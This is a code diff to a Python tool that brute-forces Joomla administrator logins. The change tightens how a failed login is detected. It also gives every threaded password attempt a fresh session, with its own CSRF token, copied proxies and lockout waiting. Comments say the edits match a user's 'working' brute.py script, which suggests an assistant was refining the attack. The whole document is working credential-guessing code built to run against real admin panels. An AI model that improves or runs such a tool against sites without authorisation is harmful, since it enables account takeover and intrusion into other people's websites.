@@ -509,18 +509,16 @@ def _detect_lockout(html: str) -> bool:
 
 
 def _is_login_failure(soup: BeautifulSoup) -> bool:
-    """Return True if the page contains a Joomla login error alert."""
-    # Check for standard alert containers (Joomla 3/4/5)
-    # The working script specifically checks for 'alert-message'
-    for cls in ("alert-message", "alert-error", "alert-danger", "alert-warning"):
-        if soup.find(class_=cls):
-            return True
-            
-    # Also check generic "alert" classes if they contain "Invalid" or "Warning"
-    alerts = soup.find_all("div", class_=re.compile(r"alert"))
-    for a in alerts:
-        text = a.get_text().lower()
-        if "invalid" in text or "warning" in text or "match" in text:
+    """
+    Return True if the page contains a Joomla login error alert.
+    Simplified to match the user's working script (brute.py) exactly.
+    """
+    # Specific Joomla error containers.
+    # brute.py checks specifically for 'alert-message'.
+    # We include a few common variants but REMOVE the generic text search
+    # to avoid false positives from dashboard notices/warnings.
+    for cls in ("alert-message", "alert-error", "alert-danger"):
+        if soup.find("div", class_=cls):
             return True
             
     return False
@@ -619,12 +617,21 @@ def run_brute(args, session: requests.Session) -> list:
         if stop_event.is_set():
             return None
 
+        # Create a fresh session PER ATTEMPT to avoid cookie collision in threads
+        # and to match brute.py's stateless behavior.
+        # We copy key config from the main session (proxies, verify, headers)
+        local_session = requests.Session()
+        local_session.proxies.update(session.proxies)
+        local_session.verify = session.verify
+        local_session.headers.update(session.headers)
+
         # Honour lockout pause
         wait = lockout_until[0] - time.monotonic()
         if wait > 0:
             time.sleep(wait)
 
-        result = _try_credential(session, admin_url, username,
+        # Grab a fresh CSRF token and try login
+        result = _try_credential(local_session, admin_url, username,
                                  password, timeout, verbose)
 
         if result.locked_out:
